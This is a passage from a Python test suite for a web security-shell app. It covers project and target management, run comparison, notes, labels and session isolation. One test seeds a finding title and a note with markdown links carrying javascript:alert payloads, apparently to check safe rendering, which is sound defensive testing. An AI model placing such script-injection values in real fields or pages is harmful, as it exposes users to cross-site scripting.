            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (fallback_target["id"],),
            ).fetchone()[0] == 1
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_labels "
                "WHERE session_id = ? AND entity_type = 'finding' AND label = 'finding-kept'",
                (session_id,),
            ).fetchone()[0] == 1
            assert conn.execute(
                "SELECT COUNT(*) FROM findings "
                "WHERE session_id = ? AND run_id = 'run_target_delete' AND target_id = ?",
                (session_id, target["id"]),
            ).fetchone()[0] == 1

        update_resp = client.put(
            f"/projects/{project['id']}",
            json={"name": "Renamed Review", "status": "archived", "notes": "private notes"},
            headers={"X-Session-ID": session_id},
        )
        assert update_resp.status_code == 200
        updated = json.loads(update_resp.data)["project"]
        assert updated["name"] == "Renamed Review"
        assert updated["slug"] == "renamed-review"
        assert updated["status"] == "archived"
        assert updated["note"]["body"] == "private notes"
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT body FROM entity_notes "
                "WHERE session_id = ? AND entity_type = 'project' AND entity_id = ?",
                (session_id, project["id"]),
            ).fetchone()[0] == "private notes"

        default_list = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert default_list["projects"] == []
        archived_list = json.loads(
            client.get("/projects?include_archived=1", headers={"X-Session-ID": session_id}).data
        )
        assert [item["id"] for item in archived_list["projects"]] == [project["id"]]

        unarchive_resp = client.put(
            f"/projects/{project['id']}",
            json={"status": "active"},
            headers={"X-Session-ID": session_id},
        )
        assert unarchive_resp.status_code == 200
        unarchived = json.loads(unarchive_resp.data)["project"]
        assert unarchived["status"] == "active"
        default_list_after_unarchive = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert [item["id"] for item in default_list_after_unarchive["projects"]] == [project["id"]]

        cleanup_target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "cleanup.darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        assert cleanup_target_resp.status_code == 201
        cleanup_target = json.loads(cleanup_target_resp.data)["target"]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'project', ?, 'delete-me', datetime('now'))",
                ("lbl_project_delete_" + uuid.uuid4().hex, session_id, project["id"]),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'target', ?, 'delete target note', datetime('now'), datetime('now'))",
                ("note_target_delete_" + uuid.uuid4().hex, session_id, cleanup_target["id"]),
            )
            conn.commit()

        delete_resp = client.delete(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
        assert delete_resp.status_code == 200
        missing_resp = client.get(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
        assert missing_resp.status_code == 404
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (project["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'project' AND entity_id = ?",
                (project["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (cleanup_target["id"],),
            ).fetchone()[0] == 0

    def test_delete_project_keeps_entity_owned_finding_target_when_entity_is_linked_elsewhere(self):
        client = get_client()
        session_id = self._session_id("project-delete-primary-target")
        deleted_project = self._create_project(client, session_id, name="Deleted target project")
        remaining_project = self._create_project(client, session_id, name="Remaining target project")
        deleted_target = json.loads(client.post(
            f"/projects/{deleted_project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        remaining_target = json.loads(client.post(
            f"/projects/{remaining_project['id']}/targets",
            json={"type": "host", "value": "api.darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        run_id = "run_project_delete_target_" + uuid.uuid4().hex
        finding_id = "fnd_" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'nmap darklab.sh', datetime('now'))",
                (run_id, session_id),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, raw_line, created) "
                "VALUES (?, ?, ?, ?, 'finding', 'target finding', datetime('now'))",
                (finding_id, session_id, run_id, deleted_target["id"]),
            )
            conn.commit()

        delete_resp = client.delete(
            f"/projects/{deleted_project['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert delete_resp.status_code == 200
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT target_id FROM findings WHERE session_id = ? AND id = ?",
                (session_id, finding_id),
            ).fetchone()[0] == deleted_target["id"]
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (deleted_project["id"],),
            ).fetchone()[0] == 0
            assert remaining_target["id"]

    def test_projects_are_session_scoped_and_slugs_are_unique_per_session(self):
        client = get_client()
        session_a = self._session_id("project-a")
        session_b = self._session_id("project-b")
        first = self._create_project(client, session_a, "Case")
        second = self._create_project(client, session_a, "Case")
        other_session = self._create_project(client, session_b, "Case")

        assert first["slug"] == "case"
        assert second["slug"] == "case-2"
        assert other_session["slug"] == "case"
        page = json.loads(client.get(
            "/projects?include_archived=1&limit=1&offset=1",
            headers={"X-Session-ID": session_a},
        ).data)
        assert page["total"] == 2
        assert page["offset"] == 1
        assert len(page["projects"]) == 1

        hidden = client.get(f"/projects/{first['id']}", headers={"X-Session-ID": session_b})
        assert hidden.status_code == 404

    def test_sets_gets_and_clears_active_project(self):
        client = get_client()
        session_id = self._session_id("project-active")
        project = self._create_project(client, session_id, "Active Case")

        empty = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert empty["project"] is None

        set_resp = client.post(
            "/projects/active",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        assert set_resp.status_code == 200
        assert json.loads(set_resp.data)["project"]["id"] == project["id"]

        current = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert current["project"]["slug"] == "active-case"

        clear_resp = client.delete("/projects/active", headers={"X-Session-ID": session_id})
        assert clear_resp.status_code == 200
        assert json.loads(clear_resp.data)["cleared"] is True
        cleared = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert cleared["project"] is None

        cli_session = self._session_id("project-cli")
        create_lines, create_code = execute_builtin_command("project create CLI Case", cli_session)
        assert create_code == 0
        assert "created CLI Case" in "\n".join(line["text"] for line in create_lines)

        current_lines, _ = execute_builtin_command("project current", cli_session)
        current_text = "\n".join(line["text"] for line in current_lines)
        assert "Active project:" in current_text
        assert "CLI Case" in current_text

        list_lines, _ = execute_builtin_command("project list", cli_session)
        assert "cli-case" in "\n".join(line["text"] for line in list_lines)

        clear_lines, _ = execute_builtin_command("project clear", cli_session)
        assert clear_lines[0]["text"] == "project: active project cleared"

        use_lines, _ = execute_builtin_command("project use cli-case", cli_session)
        assert "active project is CLI Case" in use_lines[0]["text"]

        rename_lines, _ = execute_builtin_command("project rename cli-case CLI Case Renamed", cli_session)
        assert "renamed CLI Case Renamed" in rename_lines[0]["text"]
        renamed_current, _ = execute_builtin_command("project current", cli_session)
        assert "CLI Case Renamed" in "\n".join(line["text"] for line in renamed_current)

        tab_one_run = self._seed_run(
            cli_session,
            "sleep 10",
            run_id="run-tab-one-" + uuid.uuid4().hex,
            owner_tab_id="tab-1",
            started="'2026-05-15T00:00:00+00:00'",
        )
        tab_two_run = self._seed_run(
            cli_session,
            "dig darklab.sh",
            run_id="run-tab-two-" + uuid.uuid4().hex,
            owner_tab_id="tab-2",
            started="'2026-05-15T00:01:00+00:00'",
        )
        link_last_lines, _ = execute_builtin_command("project link run last", cli_session, tab_id="tab-1")
        assert f"linked run {tab_one_run}" in link_last_lines[0]["text"]
        link_session_last_lines, _ = execute_builtin_command("project link last", cli_session)
        assert f"linked run {tab_two_run}" in link_session_last_lines[0]["text"]

        target_lines, _ = execute_builtin_command("project target add domain darklab.sh", cli_session)
        assert target_lines[0]["text"] == "project: target added domain darklab.sh"
        quick_target_lines, _ = execute_builtin_command("project target quick-add https://ip.darklab.sh/admin", cli_session)
        assert quick_target_lines[0]["text"] == "project: target added url https://ip.darklab.sh/admin"
        target_list_lines, _ = execute_builtin_command("project target list", cli_session)
        target_list_text = "\n".join(line["text"] for line in target_list_lines)
        assert "darklab.sh" in target_list_text
        assert "https://ip.darklab.sh/admin" in target_list_text
        remove_target_lines, _ = execute_builtin_command("project target remove darklab.sh", cli_session)
        assert remove_target_lines[0]["text"] == "project: target removed darklab.sh"

        archive_lines, _ = execute_builtin_command("project archive cli-case-renamed", cli_session)
        assert "archived CLI Case Renamed" in archive_lines[0]["text"]

        archived_current, _ = execute_builtin_command("project current", cli_session)
        assert archived_current[0]["text"].startswith("No active project.")

        unarchive_lines, _ = execute_builtin_command("project unarchive cli-case-renamed", cli_session)
        assert "unarchived CLI Case Renamed" in unarchive_lines[0]["text"]

        unarchived_current, _ = execute_builtin_command("project current", cli_session)
        assert unarchived_current[0]["text"].startswith("No active project.")

        delete_lines, _ = execute_builtin_command("project delete cli-case-renamed", cli_session)
        assert "deleted CLI Case Renamed" in delete_lines[0]["text"]
        deleted_list_lines, _ = execute_builtin_command("project list --all", cli_session)
        assert "cli-case-renamed" not in "\n".join(line["text"] for line in deleted_list_lines)

    def test_active_project_rejects_cross_session_and_clears_stale_projects(self):
        client = get_client()
        session_id = self._session_id("project-active")
        other_session = self._session_id("project-other")
        project = self._create_project(client, session_id, "Current Case")
        other_project = self._create_project(client, other_session, "Other Case")

        cross_session = client.post(
            "/projects/active",
            json={"project_id": other_project["id"]},
            headers={"X-Session-ID": session_id},
        )
        assert cross_session.status_code == 404

        set_resp = client.post(
            "/projects/active",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        assert set_resp.status_code == 200
        client.put(
            f"/projects/{project['id']}",
            json={"status": "archived"},
            headers={"X-Session-ID": session_id},
        )
        archived = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert archived["project"] is None

        revived = self._create_project(client, session_id, "Delete Me")
        client.post(
            "/projects/active",
            json={"project_id": revived["id"]},
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(f"/projects/{revived['id']}", headers={"X-Session-ID": session_id})
        assert delete_resp.status_code == 200
        deleted = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert deleted["project"] is None

    def test_entity_note_routes_enforce_session_and_payload_boundaries(self):
        client = get_client()
        session_id = self._session_id("note-owner")
        other_session = self._session_id("note-other")
        run_id = self._seed_run(session_id)
        snapshot_id = self._seed_snapshot(session_id)

        create_resp = client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "Owner-only note"},
            headers={"X-Session-ID": session_id},
        )
        assert create_resp.status_code == 200

        for method in ("get", "put", "delete"):
            request = getattr(client, method)
            kwargs = {"headers": {"X-Session-ID": other_session}}
            if method == "put":
                kwargs["json"] = {"body": "Cross-session overwrite"}
            resp = request(f"/entities/run/{run_id}/note", **kwargs)
            assert resp.status_code == 404

        missing_body = client.put(
            f"/entities/run/{run_id}/note",
            json={},
            headers={"X-Session-ID": session_id},
        )
        assert missing_body.status_code == 400
        whitespace_body = client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "   "},
            headers={"X-Session-ID": session_id},
        )
        assert whitespace_body.status_code == 400
        non_object = client.put(
            f"/entities/run/{run_id}/note",
            json=["not", "an", "object"],
            headers={"X-Session-ID": session_id},
        )
        assert non_object.status_code == 400
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
        unsupported_type = client.put(
            f"/entities/not_supported/{run_id}/note",
            json={"body": "Nope"},
            headers={"X-Session-ID": session_id},
        )
        assert unsupported_type.status_code == 400
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
        missing_entity = client.put(
            "/entities/run/missing-run/note",
            json={"body": "Missing"},
            headers={"X-Session-ID": session_id},
        )
        assert missing_entity.status_code == 404

        owner_note = json.loads(client.get(
            f"/entities/run/{run_id}/note",
            headers={"X-Session-ID": session_id},
        ).data)["note"]
        assert owner_note["body"] == "Owner-only note"

        snapshot_label_resp = client.post(
            f"/entities/snapshot/{snapshot_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        assert snapshot_label_resp.status_code == 201
        snapshot_note_resp = client.put(
            f"/entities/snapshot/{snapshot_id}/note",
            json={"body": "Snapshot context"},
            headers={"X-Session-ID": session_id},
        )
        assert snapshot_note_resp.status_code == 200
        snapshot_labels = json.loads(client.get(
            f"/entities/snapshot/{snapshot_id}/labels",
            headers={"X-Session-ID": session_id},
        ).data)["labels"]
        assert [item["label"] for item in snapshot_labels] == ["handoff"]
        snapshot_note = json.loads(client.get(
            f"/entities/snapshot/{snapshot_id}/note",
            headers={"X-Session-ID": session_id},
        ).data)["note"]
        assert snapshot_note["body"] == "Snapshot context"

        cross_session_label = client.get(
            f"/entities/snapshot/{snapshot_id}/labels",
            headers={"X-Session-ID": other_session},
        )
        cross_session_note = client.get(
            f"/entities/snapshot/{snapshot_id}/note",
            headers={"X-Session-ID": other_session},
        )
        assert cross_session_label.status_code == 404
        assert cross_session_note.status_code == 404

        delete_label_resp = client.delete(
            f"/entities/snapshot/{snapshot_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        delete_note_resp = client.delete(
            f"/entities/snapshot/{snapshot_id}/note",
            headers={"X-Session-ID": session_id},
        )
        assert delete_label_resp.status_code == 200
        assert delete_note_resp.status_code == 200

    def test_project_compare_rejects_unlinked_cross_session_and_invalid_pairs(self):
        client = get_client()
        session_id = self._session_id("compare")
        other_session = self._session_id("compare-other")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "httpx darklab.sh")
        unlinked_run_id = self._seed_run(session_id, "nuclei darklab.sh")
        other_run_id = self._seed_run(other_session, "nmap other.example")
        self._link_run(client, session_id, project["id"], left_run_id)

        one_linked = client.get(
            self._project_compare_url(project["id"]),
            headers={"X-Session-ID": session_id},
        )
        assert one_linked.status_code == 400
        removed_project_route = client.get(
            f"/projects/{project['id']}/compare?left_run_id={left_run_id}&right_run_id={right_run_id}",
            headers={"X-Session-ID": session_id},
        )
        assert removed_project_route.status_code == 404

        self._link_run(client, session_id, project["id"], right_run_id)
        same_run = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=left_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert same_run.status_code == 400
        unlinked = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=unlinked_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert unlinked.status_code == 400
        cross_session = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=other_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert cross_session.status_code == 400
        missing_baseline = client.get(
            self._project_compare_url(project["id"], left=left_run_id, baseline_label="missing"),
            headers={"X-Session-ID": session_id},
        )
        assert missing_baseline.status_code == 400
        missing_project = client.get(
            self._project_compare_url("missing-project", left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert missing_project.status_code == 404

    def test_project_compare_returns_empty_diffs_for_matching_empty_runs(self):
        client = get_client()
        session_id = self._session_id("compare-empty")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "nmap darklab.sh")
        self._link_run(client, session_id, project["id"], left_run_id)
        self._link_run(client, session_id, project["id"], right_run_id)

        resp = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 200
        payload = json.loads(resp.data)
        assert "findings" not in payload
        assert "artifacts" not in payload
        assert payload["objects"]["findings"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert payload["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert len(payload["density_buckets"]) == 256
        assert payload["density_buckets"][0] == {
            "start": 0, "end": 0, "equal": 0, "added": 0, "removed": 0, "changed": 0,
        }
        assert payload["limits"]["minimap_buckets"] == 256
        assert payload["truncated"] == {
            "left": False,
            "right": False,
            "changed_lines": False,
            "hunks_omitted": 0,
            "lines_omitted": {"left": 0, "right": 0, "total": 0},
        }

        with sqlite3.connect(DB_PATH) as conn:
            for line_number, raw_line in enumerate([
                "one.darklab.sh",
                "two.darklab.sh",
                "old.darklab.sh",
            ]):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                    (
                        f"fnd_compare_left_{line_number}_{uuid.uuid4().hex[:8]}",
                        session_id,
                        left_run_id,
                        raw_line,
                        raw_line,
                        line_number,
                        f"fp-left-{line_number}-{left_run_id}",
                    ),
                )
            for line_number, raw_line in enumerate([
                "two.darklab.sh",
                "one.darklab.sh",
                "new.darklab.sh",
            ]):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                    (
                        f"fnd_compare_right_{line_number}_{uuid.uuid4().hex[:8]}",
                        session_id,
                        right_run_id,
                        raw_line,
                        raw_line,
                        line_number,
                        f"fp-right-{line_number}-{right_run_id}",
                    ),
                )
            for prefix, run_id in (("left", left_run_id), ("right", right_run_id)):
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                    "VALUES (?, ?, ?, ?, ?, 'output', 8, 'workspace_flag', datetime('now'))",
                    (
                        f"rfa_compare_cap_{prefix}_{uuid.uuid4().hex[:8]}",
                        session_id,
                        run_id,
                        f"reports/{prefix}.txt",
                        f"{prefix}.txt",
                    ),
                )
            conn.commit()

        diff_resp = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert diff_resp.status_code == 200
        diff_payload = json.loads(diff_resp.data)
        assert [item["raw_line"] for item in diff_payload["objects"]["findings"]["added"]] == ["new.darklab.sh"]
        assert [item["raw_line"] for item in diff_payload["objects"]["findings"]["removed"]] == ["old.darklab.sh"]
        assert "compare_line_index" not in diff_payload["objects"]["findings"]["added"][0]
        assert diff_payload["objects"]["findings"]["added"][0]["line_number"] == 2
        assert diff_payload["objects"]["findings"]["unchanged_count"] == 2

        with mock.patch("services.runs.comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
            capped_resp = client.get(
                self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
                headers={"X-Session-ID": session_id},
            )
        assert capped_resp.status_code == 200
        capped = json.loads(capped_resp.data)
        assert capped["left"]["persisted_finding_count"] == 3
        assert capped["right"]["persisted_finding_count"] == 3
        assert capped["left"]["artifact_count"] == 1
        assert capped["right"]["artifact_count"] == 1
        assert "findings" not in capped
        assert "artifacts" not in capped
        assert capped["objects"]["findings"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert capped["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert capped["truncated"] == {
            "left": True,
            "right": True,
            "changed_lines": False,
            "hunks_omitted": 0,
            "lines_omitted": {"left": 0, "right": 0, "total": 0},
            "findings": {"left": True, "right": True},
            "artifacts": {"left": True, "right": True},
            "item_limit": 0,
        }

    def test_project_and_history_compare_match_artifacts_by_content_hash(self):
        client = get_client()
        session_id = self._session_id("compare-artifact-hash")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "nmap darklab.sh")
        self._link_run(client, session_id, project["id"], left_run_id)
        self._link_run(client, session_id, project["id"], right_run_id)
        artifact_hash = hashlib.sha256(b"same artifact bytes").hexdigest()
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
                "detected_by, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/left.txt', 'left.txt', 'output', 19, "
                "'workspace_flag', ?, datetime('now'))",
                (f"rfa_left_{uuid.uuid4().hex[:8]}", session_id, left_run_id, artifact_hash),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
                "detected_by, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/right.txt', 'right.txt', 'output', 19, "
                "'workspace_flag', ?, datetime('now'))",
                (f"rfa_right_{uuid.uuid4().hex[:8]}", session_id, right_run_id, artifact_hash),
            )
            conn.commit()

        history_resp = client.get(
            f"/history/compare?left={left_run_id}&right={right_run_id}",
            headers={"X-Session-ID": session_id},
        )
        project_resp = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert history_resp.status_code == 200
        assert project_resp.status_code == 200
        history_artifacts = json.loads(history_resp.data)["objects"]["artifacts"]
        project_artifacts = json.loads(project_resp.data)["objects"]["artifacts"]
        assert history_artifacts == {"added": [], "removed": [], "unchanged_count": 1}
        assert project_artifacts == history_artifacts

    def test_project_scoped_compare_lines_requires_linked_project_runs(self):
        client = get_client()
        session_id = self._session_id("compare-lines")
        other_session = self._session_id("compare-lines-other")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "nmap darklab.sh")
        unlinked_run_id = self._seed_run(session_id, "nmap unlinked.example")
        self._link_run(client, session_id, project["id"], left_run_id)
        self._link_run(client, session_id, project["id"], right_run_id)

        linked = client.get(
            f"/history/compare/lines?left={left_run_id}&right={right_run_id}"
            f"&project_id={project['id']}&side=a&start=0&end=0",
            headers={"X-Session-ID": session_id},
        )
        assert linked.status_code == 200
        assert json.loads(linked.data)["lines"] == []

        unlinked = client.get(
            f"/history/compare/lines?left={left_run_id}&right={unlinked_run_id}"
            f"&project_id={project['id']}&side=a&start=0&end=0",
            headers={"X-Session-ID": session_id},
        )
        assert unlinked.status_code == 400

        cross_session = client.get(
            f"/history/compare/lines?left={left_run_id}&right={right_run_id}"
            f"&project_id={project['id']}&side=a&start=0&end=0",
            headers={"X-Session-ID": other_session},
        )
        assert cross_session.status_code == 404

    @mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}, clear=False)
    def test_links_run_and_unlinks_without_duplicate_rows(self):
        client = get_client()
        session_id = self._session_id("project-link")
        project = self._create_project(client, session_id)

        notes_resp = client.put(
            f"/projects/{project['id']}",
            json={"notes": "Package notes for the external handoff."},
            headers={"X-Session-ID": session_id},
        )
        assert notes_resp.status_code == 200
        run_id = "run-" + uuid.uuid4().hex
        baseline_run_id = "run-" + uuid.uuid4().hex
        outside_run_id = "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    run_id,
                    session_id,
                    "nmap darklab.sh",
                    json.dumps([
                        {"text": "443/tcp open https", "cls": "", "line_index": 0},
                        {"text": "scan completed", "cls": "", "line_index": 1},
                    ]),
                    2,
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    baseline_run_id,
                    session_id,
                    "nmap darklab.sh",
                    json.dumps([{"text": "80/tcp open http", "cls": "", "line_index": 0}]),
                    1,
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    outside_run_id,
                    session_id,
                    "httpx https://outside.darklab.sh",
                    json.dumps([{"text": "outside project", "cls": "", "line_index": 0}]),
                    1,
                ),
            )
            conn.commit()

        payload = {"entity_type": "run", "entity_id": run_id, "source": "manual"}
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json=payload,
            headers={"X-Session-ID": session_id},
        )
        duplicate_resp = client.post(
            f"/projects/{project['id']}/links",
            json=payload,
            headers={"X-Session-ID": session_id},
        )
        assert link_resp.status_code == 201
        assert duplicate_resp.status_code == 201
        first_link = json.loads(link_resp.data)["link"]
        duplicate_link = json.loads(duplicate_resp.data)["link"]
        assert first_link["id"] == duplicate_link["id"]
        baseline_link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": baseline_run_id, "source": "manual"},
            headers={"X-Session-ID": session_id},
        )
        assert baseline_link_resp.status_code == 201

        links = json.loads(
            client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data
        )
        assert {item["entity_id"] for item in links["links"]} == {run_id, baseline_run_id}

        label_resp = client.post(
            f"/entities/run/{run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        duplicate_label = client.post(
            f"/entities/run/{run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        assert label_resp.status_code == 201
        assert duplicate_label.status_code == 201
        label = json.loads(label_resp.data)["label"]
        assert json.loads(duplicate_label.data)["label"]["id"] == label["id"]
        labels = json.loads(client.get(
            f"/entities/run/{run_id}/labels",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["label"] for item in labels["labels"]] == ["baseline"]

        note_resp = client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "Confirm service owner"},
            headers={"X-Session-ID": session_id},
        )
        assert note_resp.status_code == 200
        note = json.loads(note_resp.data)["note"]
        assert note["body"] == "Confirm service owner"
        assert note["entity_id"] == run_id
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            artifact_path = resolve_workspace_path(session_id, "reports/run.txt", shell_app.CFG, ensure_parent=True)
            artifact_bytes = b"0123456789"
            artifact_path.write_bytes(artifact_bytes)
            artifact_hash = hashlib.sha256(artifact_bytes).hexdigest()
        updated_note = json.loads(client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "Confirmed service owner"},
            headers={"X-Session-ID": session_id},
        ).data)["note"]
        assert updated_note["id"] == note["id"]
        assert updated_note["body"] == "Confirmed service owner"
        note_payload = json.loads(client.get(
            f"/entities/run/{run_id}/note",
            headers={"X-Session-ID": session_id},
        ).data)
        assert note_payload["note"]["id"] == note["id"]

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
                "detected_by, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/run.txt', 'run.txt', 'output', 10, "
                "'workspace_flag', ?, datetime('now'))",
                (f"rfa_{run_id}", session_id, run_id, artifact_hash),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'run_file_artifact', ?, 'evidence', datetime('now'))",
                (f"lbl_rfa_{run_id}", session_id, f"rfa_{run_id}"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'run_file_artifact', ?, 'Raw output reviewed', "
                "datetime('now'), datetime('now'))",
                (f"note_rfa_{run_id}", session_id, f"rfa_{run_id}"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, severity, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'high', '[click](javascript:alert(1))', "
                "'443/tcp open https', 0, ?, datetime('now'))",
                (f"fnd_{run_id}", session_id, run_id, f"fp-{run_id}"),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'finding', ?, 'important', datetime('now'))",
                (f"lbl_fnd_{run_id}", session_id, f"fnd_{run_id}"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'needs [retest](javascript:alert(2))', "
                "datetime('now'), datetime('now'))",
                (f"note_fnd_{run_id}", session_id, f"fnd_{run_id}"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/old.txt', 'old.txt', 'output', 8, 'workspace_flag', datetime('now'))",
                (f"rfa_{baseline_run_id}", session_id, baseline_run_id),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'open port 80', '80/tcp open http', 0, ?, datetime('now'))",
                (f"fnd_{baseline_run_id}", session_id, baseline_run_id, f"fp-{baseline_run_id}"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
